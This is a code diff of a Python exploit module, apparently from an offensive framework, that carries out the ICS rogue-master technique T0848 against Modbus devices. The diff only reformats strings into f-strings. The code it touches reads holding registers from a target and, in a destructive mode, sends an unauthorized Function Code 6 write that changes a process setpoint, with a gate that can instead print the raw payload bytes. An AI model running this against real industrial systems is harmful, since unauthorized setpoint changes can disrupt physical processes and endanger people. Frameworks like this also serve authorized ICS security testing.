@@ -99,33 +99,27 @@ class Exploit(Exploit):
                 if len(resp) >= 9 and resp[7] == 0x03:
                     byte_count = resp[8]
                     data = resp[9:9+byte_count]
-                    print_success("[T0848] Rogue master read {} registers from {}:{}.".format(
-                        byte_count // 2, self.target, self.port))
+                    print_success(f"[T0848] Rogue master read {byte_count // 2} registers from {self.target}:{self.port}.")
                     values = [struct.unpack(">H", data[i:i+2])[0] for i in range(0, len(data), 2)]
-                    print_info("[T0848] Register values (addr 0-9): {}".format(values[:10]))
+                    print_info(f"[T0848] Register values (addr 0-9): {values[:10]}")
                     print_warning("[T0848] T0848 confirmed: rogue master can read process state.")
                     DestructiveGate.print_simulation(
                         description=(
                             "In destructive mode: rogue master would send FC6 Write to "
-                            "register {} value {} — modifying process setpoint "
-                            "without legitimate operator action.".format(
-                                self.write_address, self.write_value
-                            )
+                            f"register {self.write_address} value {self.write_value} — modifying process setpoint "
+                            "without legitimate operator action."
                         ),
-                        payload_hex="00 01 00 00 00 06 {:02X} 06 {:04X} {:04X}".format(
-                            self.unit_id, self.write_address, self.write_value
-                        ),
+                        payload_hex=f"00 01 00 00 00 06 {self.unit_id:02X} 06 {self.write_address:04X} {self.write_value:04X}",
                         mitre_techniques=["T0848", "T1692.001"],
                     )
                 else:
                     print_info("[T0848] No valid Modbus response.")
             except Exception as exc:
-                print_error("[T0848] Error: {}".format(exc))
+                print_error(f"[T0848] Error: {exc}")
             return
 
         # Destructive: send unauthorized write
-        print_status("[T0848 LIVE] Sending unauthorized FC6 write to {}:{}…".format(
-            self.target, self.port))
+        print_status(f"[T0848 LIVE] Sending unauthorized FC6 write to {self.target}:{self.port}…")
         try:
             pdu = struct.pack(
                 ">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x06,
@@ -138,10 +132,8 @@ class Exploit(Exploit):
             resp = sock.recv(32)
             sock.close()
             if len(resp) >= 8 and resp[7] == 0x06:
-                print_success("[T0848] Rogue write accepted — register {} set to {}.".format(
-                    self.write_address, self.write_value
-                ))
+                print_success(f"[T0848] Rogue write accepted — register {self.write_address} set to {self.write_value}.")
             else:
-                print_error("[T0848] Write response unexpected: {}".format(resp.hex()))
+                print_error(f"[T0848] Write response unexpected: {resp.hex()}")
         except Exception as exc:
-            print_error("[T0848] Error: {}".format(exc))
+            print_error(f"[T0848] Error: {exc}")
